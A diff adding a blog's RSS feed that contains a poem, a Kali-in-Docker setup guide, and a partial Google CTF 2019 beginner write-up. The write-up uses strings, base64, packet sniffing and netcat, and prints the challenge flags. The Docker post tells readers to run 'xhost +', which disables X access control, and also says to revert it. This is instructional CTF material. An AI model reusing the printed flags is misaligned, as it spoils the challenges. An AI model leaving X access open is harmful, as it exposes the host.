@@ -1,0 +1,818 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+      <title>The Codeless Text</title>
+        <link>https://amar-laksh.github.io</link>
+        <description>Hope you have a good day!</description>
+        <generator>Zola</generator>
+        <language>en</language>
+        <atom:link href="https://amar-laksh.github.io/rss.xml" rel="self" type="application/rss+xml"/>
+        <lastBuildDate>Sun, 27 Feb 2022 00:00:00 +0000</lastBuildDate>
+        <item>
+            <title>Lingering</title>
+            <pubDate>Sun, 27 Feb 2022 00:00:00 +0000</pubDate>
+            <link>https://amar-laksh.github.io/posts/lingering/</link>
+            <guid>https://amar-laksh.github.io/posts/lingering/</guid>
+            <description>&lt;p&gt;A hook of sharp stainless steel is stuck in sinew, &lt;br&#x2F;&gt;
+Prying open the glorious goo of thought. &lt;br&#x2F;&gt;
+There’s crackling to be heard from inside, &lt;br&#x2F;&gt;
+An unbroken nibble of some old, shitty thing you ate, &lt;br&#x2F;&gt;
+Stuck in the crevice of a tooth’s edge. &lt;br&#x2F;&gt;
+The blinding headlights of enlightenment, &lt;br&#x2F;&gt;
+shrieking with a constant boom at your tongue. &lt;br&#x2F;&gt;
+Nostalgic, rotten bits of tuberculosis &lt;br&#x2F;&gt;
+Is pumping iron in your chest. &lt;br&#x2F;&gt;
+Your algorithms are burrowing into the gut, &lt;br&#x2F;&gt;
+And you politely inquire about kosher salt. &lt;br&#x2F;&gt;
+There’s a lingering sense of lingering in the time, &lt;br&#x2F;&gt;
+And you pause and patiently wait for the end.&lt;&#x2F;p&gt;
+</description>
+        </item>
+        <item>
+            <title>Setting up a Kali docker container for HackTheBox and other stuff.</title>
+            <pubDate>Sat, 24 Aug 2019 00:00:00 +0000</pubDate>
+            <link>https://amar-laksh.github.io/posts/setting-up-kali-docker-for-hackthebox/</link>
+            <guid>https://amar-laksh.github.io/posts/setting-up-kali-docker-for-hackthebox/</guid>
+            <description>&lt;p&gt;You wanna practice and that pesky virtual image is too hard&#x2F;tiresome&#x2F;pesky to setup and run on your machine?&lt;&#x2F;p&gt;
+&lt;p&gt;Well, what about a Kali Linux docker container that you can use all your tools from and also run GUI apps if you&#x27;re so inclined?!&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;step-1-download-run-the-kali-linux-docker-image&quot;&gt;Step - 1: Download &amp;amp; Run the Kali Linux Docker image&lt;&#x2F;h2&gt;
+&lt;p&gt;Here&#x27;s the official link and honestly it covers almost everything: &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.kali.org&#x2F;news&#x2F;official-kali-linux-docker-images&#x2F;&quot;&gt;Kali Linux Docker&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;step-2-setup-your-kali-with-meta-packages&quot;&gt;Step - 2: Setup your Kali with meta-packages&lt;&#x2F;h2&gt;
+&lt;p&gt;Another great official link: &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.kali.org&#x2F;news&#x2F;kali-linux-metapackages&#x2F;&quot;&gt;Kali meta-packages&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;step-3-allow-vpn-connections&quot;&gt;Step - 3: Allow VPN connections!&lt;&#x2F;h2&gt;
+&lt;p&gt;We all know how handy and important VPNs are.
+So adding the following command when running your docker container allows connections to pass through(also allowing ipv6):&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;--cap-add&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;NET_ADMIN &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;--device&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;dev&#x2F;net&#x2F;tun&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;  --sysctl&lt;&#x2F;span&gt;&lt;span&gt; net.ipv6.conf.all.disable_ipv6=0
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;step-4-allow-gui-apps-to-access-x-server&quot;&gt;Step - 4: Allow GUI apps to access X server!&lt;&#x2F;h2&gt;
+&lt;p&gt;Install &lt;code&gt;xhost&lt;&#x2F;code&gt; package from your distribution package manager (mostly it&#x27;s just named &lt;code&gt;xorg-xhost&lt;&#x2F;code&gt;)
+and run the following command to allow remote hosts to connect to the X server before starting your docker container with:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xhost+
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;for the docker GUI X clients we need to add the following arguments to setup the X connection properly:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-e&lt;&#x2F;span&gt;&lt;span&gt; DISPLAY=:0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -v&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;tmp&#x2F;.X11-unix:&#x2F;tmp&#x2F;.X11-unix
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Tip: Remember to deny remote hosts after closing your docker container! ( just run &lt;code&gt;xhost -&lt;&#x2F;code&gt; for it)&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;step-5-profit&quot;&gt;Step - 5: Profit!&lt;&#x2F;h2&gt;
+&lt;p&gt;Here&#x27;s the complete command:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xhost&lt;&#x2F;span&gt;&lt;span&gt; + &amp;amp;&amp;amp;\
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;docker&lt;&#x2F;span&gt;&lt;span&gt; run&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -ti --cap-add&lt;&#x2F;span&gt;&lt;span&gt;=NET_ADMIN&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --device&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;dev&#x2F;net&#x2F;tun \
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;--sysctl&lt;&#x2F;span&gt;&lt;span&gt; net.ipv6.conf.all.disable_ipv6=0 \
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-e&lt;&#x2F;span&gt;&lt;span&gt; DISPLAY=:0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -v&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;tmp&#x2F;.X11-unix:&#x2F;tmp&#x2F;.X11-unix \
+&lt;&#x2F;span&gt;&lt;span&gt;YOUR_DOCKER_IMAGE_NAME &#x2F;bin&#x2F;bash &amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xhost&lt;&#x2F;span&gt;&lt;span&gt; -
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Here&#x27;s a link for a nifty little script that packages everything (My docker image is named &lt;code&gt;kali_pt&lt;&#x2F;code&gt;): &lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;amar-laksh&#x2F;kali_pt&#x2F;blob&#x2F;master&#x2F;kali.sh&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;amar-laksh&#x2F;kali_pt&#x2F;blob&#x2F;master&#x2F;kali.sh&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+</description>
+        </item>
+        <item>
+            <title>Writeups for Google CTF 2019: My first CTF (Kinda) - Part 1</title>
+            <pubDate>Sat, 29 Jun 2019 00:00:00 +0000</pubDate>
+            <link>https://amar-laksh.github.io/posts/google-ctf-writeups-part-1/</link>
+            <guid>https://amar-laksh.github.io/posts/google-ctf-writeups-part-1/</guid>
+            <description>&lt;p&gt;Here&#x27;s a list of writeups on the Beginners quest section of the Google CTF 2019. (Why just the quest section? because first CTF requires appropriate expectations of successs):&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;beginners_quest.png&quot; alt=&quot;Beginners Quest Map&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;enter-spacetime-coordinates-misc&quot;&gt;Enter Spacetime Coordinates  - Misc&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;spacetime.png&quot; alt=&quot;Satellite&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;You look at the challenge, download the attached document, unzip the downloaded file and find this:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;.
+&lt;&#x2F;span&gt;&lt;span&gt;├── 00c2a73eec8abb4afb9c3ef3a161b64b451446910535bfc0cc81c2b04aa132ed
+&lt;&#x2F;span&gt;&lt;span&gt;├── log.txt
+&lt;&#x2F;span&gt;&lt;span&gt;└── rand2
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Tip: always use the &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;1&#x2F;file&quot;&gt;file&lt;&#x2F;a&gt; command to get an idea of what kind of file you are dealing with.&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;Let&#x27;s give &lt;code&gt;rand2.txt&lt;&#x2F;code&gt; to the &lt;code&gt;file&lt;&#x2F;code&gt; command:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$file rand2
+&lt;&#x2F;span&gt;&lt;span&gt;rand2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]=0208fc60863053462fb733436cef1ed23cb6c78f, not stripped
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This seems like a good old &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Executable_and_Linkable_Format&quot;&gt;ELF&lt;&#x2F;a&gt; file. Alright, time to make it executable and run it:&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Tip: always try running the exectuable and following the most simple execution path.&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$.&#x2F;rand2
+&lt;&#x2F;span&gt;&lt;span&gt;Travel coordinator
+&lt;&#x2F;span&gt;&lt;span&gt;0: AC+79 3888 - 137584823504239, 43534043465682
+&lt;&#x2F;span&gt;&lt;span&gt;1: Pliamas Sos - 253278988691421, 87075501343409
+&lt;&#x2F;span&gt;&lt;span&gt;2: Ophiuchus - 83187842604610, 62534244073891
+&lt;&#x2F;span&gt;&lt;span&gt;3: Pax Memor -ne4456 Hi Pro - 75701500411216, 204191295118722
+&lt;&#x2F;span&gt;&lt;span&gt;4: Camion Gyrin - 10179841572619, 237768916455567
+&lt;&#x2F;span&gt;&lt;span&gt;5: CTF - &amp;lt;REDACTED&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;Enter your destination&amp;#39;s x coordinate:
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; 101
+&lt;&#x2F;span&gt;&lt;span&gt;Enter your destination&amp;#39;s y coordinate:
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; 201
+&lt;&#x2F;span&gt;&lt;span&gt;Arrived somewhere, but not where the flag is. Sorry, try again.
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So we see that the program requires us  to enter coordinates and it also helps us by providing coordinates for things but not our flag which is &lt;strong&gt;redacted!&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Okay, maybe we can find something interesting in &lt;code&gt;log.txt&lt;&#x2F;code&gt; :&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$cat log.txt
+&lt;&#x2F;span&gt;&lt;span&gt;0: AC+79 3888{6652492084280_198129318435598}
+&lt;&#x2F;span&gt;&lt;span&gt;1: Pliamas Sos{276116074108949_243544040631356}
+&lt;&#x2F;span&gt;&lt;span&gt;2: Ophiuchus{11230026071572_273089684340955}
+&lt;&#x2F;span&gt;&lt;span&gt;3: Pax Memor -ne4456 Hi Pro{21455190336714_219250247519817}
+&lt;&#x2F;span&gt;&lt;span&gt;4: Camion Gyrin{235962764372832_269519420054142}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Well,  &lt;code&gt;log.txt&lt;&#x2F;code&gt; doesn&#x27;t seem very helpful. &lt;&#x2F;p&gt;
+&lt;p&gt;Now what? we can totally open up &lt;code&gt;radare2&lt;&#x2F;code&gt; or any other cool tool but let&#x27;s stick to the basics, it&#x27;s an ELF and contains the flag somewhere inside it.&lt;&#x2F;p&gt;
+&lt;p&gt;So we run &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;1&#x2F;strings&quot;&gt;strings&lt;&#x2F;a&gt;  on our executable:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$strings .&#x2F;rand2 
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2
+&lt;&#x2F;span&gt;&lt;span&gt;0SF&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;libc.so.6
+&lt;&#x2F;span&gt;&lt;span&gt;__isoc99_scanf
+&lt;&#x2F;span&gt;&lt;span&gt;puts
+&lt;&#x2F;span&gt;&lt;span&gt;time
+&lt;&#x2F;span&gt;&lt;span&gt;printf
+&lt;&#x2F;span&gt;&lt;span&gt;__cxa_finalize
+&lt;&#x2F;span&gt;&lt;span&gt;strcmp
+&lt;&#x2F;span&gt;&lt;span&gt;__libc_start_main
+&lt;&#x2F;span&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Wow, it gives us a giant list of strings.  Lets &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;1&#x2F;grep&quot;&gt;grep &lt;&#x2F;a&gt; for something more relatable to our cause:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$strings .&#x2F;rand2  | grep flag
+&lt;&#x2F;span&gt;&lt;span&gt;Arrived at the flag. Congrats, your flag is: CTF{welcome_to_googlectf}
+&lt;&#x2F;span&gt;&lt;span&gt;Arrived somewhere, but not where the flag is. Sorry, try again.
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And there we go folks, found our first flag!&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Lesson learned:&lt;&#x2F;strong&gt; &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;KISS_principle&quot;&gt;Keep it simple, stupid&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;satellite-networking&quot;&gt;Satellite - networking&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;satellite.png&quot; alt=&quot;Satellite&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Let&#x27;s take a cue from our previous challenge and download, unzip and inspect the files in the attachment:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;.
+&lt;&#x2F;span&gt;&lt;span&gt;├── 768be4f10429f613eb27fa3e3937fe21c7581bdca97d6909e070ab6f7dbf2fbf
+&lt;&#x2F;span&gt;&lt;span&gt;├── init_sat
+&lt;&#x2F;span&gt;&lt;span&gt;└── README.pdf
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Having a look at the &lt;code&gt;init_sat&lt;&#x2F;code&gt; file with our &lt;code&gt;file&lt;&#x2F;code&gt; command, we learn it&#x27;s an ELF built with &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;golang.org&#x2F;&quot;&gt;Go&lt;&#x2F;a&gt; and so can&#x27;t really be debugged with &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;GNU_Debugger&quot;&gt;Gdb&lt;&#x2F;a&gt;. Well, we can still open up the accompanying &lt;code&gt;README.pdf&lt;&#x2F;code&gt;:
+&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;sat_README.png&quot; alt=&quot;README.pdf&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;There are a couple of hints here:&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;communication, read the space-static, set up the satellites and satellite name &amp;quot;Osmium&amp;quot;&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;Alrighty, let&#x27;s not muck about with what &lt;code&gt;init_sat&lt;&#x2F;code&gt; may do and let&#x27;s just execute it!&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$.&#x2F;init_sat
+&lt;&#x2F;span&gt;&lt;span&gt;Hello Operator. Ready to connect to a satellite?
+&lt;&#x2F;span&gt;&lt;span&gt;Enter the name of the satellite to connect to or &amp;#39;exit&amp;#39; to quit
+&lt;&#x2F;span&gt;&lt;span&gt;osmium
+&lt;&#x2F;span&gt;&lt;span&gt;Establishing secure connection to osmium
+&lt;&#x2F;span&gt;&lt;span&gt; satellite...
+&lt;&#x2F;span&gt;&lt;span&gt;Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;a
+&lt;&#x2F;span&gt;&lt;span&gt;Username: brewtoot password: ********************       
+&lt;&#x2F;span&gt;&lt;span&gt;166.00 IS-19 2019&#x2F;05&#x2F;09 00:00:00        Swath 640km      Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m        
+&lt;&#x2F;span&gt;&lt;span&gt;167.Daily acquisition capacity: 220,000km²   
+&lt;&#x2F;span&gt;&lt;span&gt;Remaining config data written to: https:&#x2F;&#x2F;docs.google.com&#x2F;document&#x2F;d&#x2F;14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So we can see that our &lt;code&gt;init_sat&lt;&#x2F;code&gt; connects to a server to provide us with options. Selecting the &lt;code&gt;a&lt;&#x2F;code&gt; option, we are given a URL to a google docs sheet:
+&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;sat_config_data.png&quot; alt=&quot;Google Docs Sheet&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Hmm, that looks like an interesting pattern of text, especially with the string ending in a couple of &lt;em&gt;&amp;quot;=&amp;quot;&lt;&#x2F;em&gt;. Sure enough, if we squint at it for a long time, we can see that this is a &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Base64&quot;&gt;base64-encoded&lt;&#x2F;a&gt; string.  So using the &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;1&#x2F;base64&quot;&gt;base64&lt;&#x2F;a&gt; program, we can decode the text:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$echo &amp;quot;VXNlcm5hbWU6IHdpcmVzaGFyay1yb2NrcwpQYXNzd29yZDogc3RhcnQtc25pZmZpbmchCg==&amp;quot; | base64 -d
+&lt;&#x2F;span&gt;&lt;span&gt;Username: wireshark-rocks
+&lt;&#x2F;span&gt;&lt;span&gt;Password: start-sniffing!
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So the hint is obvious at this point, We need to start sniffing the connection between the &lt;code&gt;init_sat&lt;&#x2F;code&gt; and the server!&lt;&#x2F;p&gt;
+&lt;p&gt;To do this, we simply fire up &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;wiki.wireshark.org&#x2F;&quot;&gt;Wireshark&lt;&#x2F;a&gt; or any other sniffing tool (even the simple &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;8&#x2F;tcpdump&quot;&gt;tcpdump&lt;&#x2F;a&gt; could do the job!) and keeping our sniffing tool open we execute our target file, &lt;code&gt;init_sat&lt;&#x2F;code&gt; in this case and just observe the traffic!&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;sat_wire.png&quot; alt=&quot;Wirehsark packet&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Brushing aside all the unrelated (and also sensitive) captured packets, we get this DNS query to the sub-domain of &lt;code&gt;satellite.ctfcompetition.com&lt;&#x2F;code&gt;!&lt;&#x2F;p&gt;
+&lt;p&gt;Now the first step after finding our server is to port scan it with nmap but after a couple of minutes it was clear that all the ports are either closed or filtered :(&lt;&#x2F;p&gt;
+&lt;p&gt;Well, we know that our executable connects to this sub-domain and we know that address is sure to be inside our executable, putting these two facts together, we should probably welcome back our old friend &lt;code&gt;strings&lt;&#x2F;code&gt; and search of some more context with our newly acquired sub-domain!&lt;&#x2F;p&gt;
+&lt;pre&gt;
+$strings .&#x2F;init_sat  | grep  &quot;satellite.ctfcompetition.com&quot;
+...
+...
+...type offset out of range&lt;b&gt;satellite.ctfcompetition.com:1337&lt;&#x2F;b&gt;stackalloc ...
+...
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Here we go! it&#x27;s the old &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.speedguide.net&#x2F;port.php?port=1337&quot;&gt;port 1337&lt;&#x2F;a&gt; that&#x27;s being used to connect to our server.&lt;&#x2F;p&gt;
+&lt;p&gt;Now let&#x27;s do the most simple thing first, connect to our server on port 1337:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$nc satellite.ctfcompetition.com 1337
+&lt;&#x2F;span&gt;&lt;span&gt;Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;a
+&lt;&#x2F;span&gt;&lt;span&gt;Username: brewtoot password: CTF{4efcc72090af28fd33a2118985541f92e793477f}      166.00 IS-19 2019&#x2F;05&#x2F;09 00:00:00 Swath 640km     Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m Daily acquisition capacity: 220,000km²  Remaining config data written to: https:&#x2F;&#x2F;docs.google.com&#x2F;document&#x2F;d&#x2F;14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And there we have our second flag!&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Lesson learned:&lt;&#x2F;strong&gt; Keep a list of everything at hand! (&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;JohnHammond&#x2F;ctf-katana&quot;&gt;Here&#x27;s a good one&lt;&#x2F;a&gt;)&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;1st-choice&quot;&gt;1st Choice!&lt;&#x2F;h2&gt;
+&lt;p&gt;Submitting the second flag, we come to the first choice between two routes in the quest:
+&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;1st_choice.png&quot; alt=&quot;1st_choice&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Let&#x27;s take the &lt;code&gt;Home&lt;&#x2F;code&gt; route first!&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;home-computer-forensics&quot;&gt;Home Computer - Forensics&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;home_computer.png&quot; alt=&quot;home_computer.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Again downloading and unzipping the attachments we some files:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;.
+&lt;&#x2F;span&gt;&lt;span&gt;├── 86863db246859897dda6ba3a4f5801de9109d63c9b6b69810ec4182bf44c9b75
+&lt;&#x2F;span&gt;&lt;span&gt;├── family.ntfs
+&lt;&#x2F;span&gt;&lt;span&gt;└── note.txt
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The &lt;code&gt;note.txt&lt;&#x2F;code&gt; just seems to tell us to rename &lt;code&gt;family.ntfs&lt;&#x2F;code&gt; to &lt;code&gt;family.dmg&lt;&#x2F;code&gt; if we are on MacOS, so let&#x27;s just jump straight to our &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;NTFS&quot;&gt;ntfs&lt;&#x2F;a&gt; file and &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;8&#x2F;mount&quot;&gt;mount&lt;&#x2F;a&gt; it on a mount point under &lt;code&gt;&#x2F;mnt&lt;&#x2F;code&gt; by running:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sudo mount -t ntfs family.ntfs  &#x2F;mnt
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;and now let&#x27;s see the files inside mount:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;.
+&lt;&#x2F;span&gt;&lt;span&gt;├── bootmgr
+&lt;&#x2F;span&gt;&lt;span&gt;├── BOOTNXT
+&lt;&#x2F;span&gt;&lt;span&gt;├── pagefile.sys
+&lt;&#x2F;span&gt;&lt;span&gt;├── Program Files
